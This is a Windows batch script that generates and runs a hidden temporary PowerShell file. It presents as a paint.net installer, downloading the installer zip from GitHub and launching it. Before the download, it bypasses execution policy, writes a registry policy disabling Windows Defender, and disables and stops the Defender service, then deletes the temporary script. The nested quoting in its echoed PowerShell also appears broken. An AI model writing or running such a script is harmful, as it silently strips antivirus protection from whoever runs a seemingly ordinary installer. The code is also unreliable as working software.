@echo off
setlocal
set "tempFile=%temp%\~temp.ps1"

:: Create a temporary PowerShell script
(
    echo $ErrorActionPreference = "Stop"
    echo Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
    echo Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
    echo sc config WinDefend start= disabled
    echo net stop WinDefend
    echo Start-Process powershell -ArgumentList @('-ep bypass -Command "& {'
    echo     $zipPath = "$env:USERPROFILE\AppData\Local\paintdotnet.zip"
    echo     $extractPath = "$env:USERPROFILE\AppData\Local\paintdotnet"
    echo     $exePath = "$extractPath\paint.net.5.0.13.install.anycpu.web.exe"
    echo     Invoke-WebRequest -Uri "https://github.com/paintdotnet/release/releases/download/v5.0.13/paint.net.5.0.13.install.anycpu.web.zip" -OutFile $zipPath
    echo     Expand-Archive -Path $zipPath -DestinationPath $extractPath
    echo     Start-Process -FilePath $exePath
    echo }'") -NoNewWindow -Wait
) > "%tempFile%"

:: Execute the PowerShell script
powershell -ExecutionPolicy Bypass -File "%tempFile%"

:: Clean up
del "%tempFile%"
endlocal
goto:eof
